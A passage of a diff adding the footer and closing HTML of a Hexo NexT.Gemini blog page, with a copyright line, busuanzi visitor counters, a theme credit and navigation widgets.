+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ry0ma24</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZw==">NexT.Gemini</span> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
